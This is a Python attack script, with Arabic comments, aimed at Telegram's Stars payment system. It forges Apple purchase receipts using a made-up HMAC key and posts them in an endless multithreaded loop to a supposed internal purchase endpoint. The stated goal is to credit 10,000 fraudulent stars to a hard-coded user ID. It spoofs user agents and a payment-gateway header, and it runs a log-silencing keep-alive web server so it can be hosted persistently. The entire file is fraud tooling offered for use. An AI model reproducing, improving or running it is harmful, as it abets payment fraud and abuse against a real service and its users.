import requests
import json
import time
import hashlib
import hmac
import os
import threading
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from http.server import HTTPServer, BaseHTTPRequestHandler

# ===== بيانات الهجوم =====
TARGET_USER_ID = "1170411845"
FAKE_STARS_AMOUNT = 10000
THREADS = 10
TELEGRAM_STARS_API = "https://core.telegram.org/stars/internal/purchase"

# ===== دوال الهجوم =====
def generate_fake_apple_receipt():
    payload = {
        "user_id": TARGET_USER_ID,
        "product_id": f"stars_pack_{FAKE_STARS_AMOUNT}",
        "quantity": 1,
        "timestamp": int(time.time()),
        "fake_nonce": os.urandom(8).hex()
    }
    secret_key = b"fake_apple_key_1234567890"
    signature = hmac.new(secret_key, json.dumps(payload).encode(), hashlib.sha256).hexdigest()
    payload["signature"] = signature
    return payload

def send_fake_purchase(thread_id):
    ua = UserAgent()
    headers = {
        "User-Agent": ua.random,
        "Content-Type": "application/json",
        "X-Telegram-From-Server": "apple-payment-gateway"
    }
    fake_data = generate_fake_apple_receipt()
    try:
        response = requests.post(TELEGRAM_STARS_API, json=fake_data, headers=headers, timeout=15)
        if response.status_code == 200:
            print(f"[✓] شغّل {thread_id}: تم الشحن الوهمي لـ {FAKE_STARS_AMOUNT} نجم للحساب {TARGET_USER_ID}")
        else:
            print(f"[✗] شغّل {thread_id}: فشل (كود {response.status_code})")
    except Exception as e:
        print(f"[!] شغّل {thread_id}: خطأ - {str(e)[:50]}")

def attack_loop():
    print(f"[*] استهداف الحساب: {TARGET_USER_ID}")
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        while True:
            futures = [executor.submit(send_fake_purchase, i) for i in range(THREADS)]
            for f in futures:
                f.result()
            time.sleep(1)

# ===== خادم ويب سريع (يُبقي السيرفر حياً) =====
class KeepAliveHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Hacking Telegram...")
    def log_message(self, format, *args):
        return  # إخفاء السجلات المزعجة

def run_webserver():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), KeepAliveHandler)
    print(f"[✓] خادم الـ Keep-Alive يعمل على المنفذ {port}")
    server.serve_forever()

# ===== التشغيل المتوازي =====
if __name__ == "__main__":
    print("[*] بدء الهجوم مع خادم وهمي...")
    # تشغيل الخادم في خيط منفصل
    threading.Thread(target=run_webserver, daemon=True).start()
    # تشغيل الهجوم
    attack_loop()
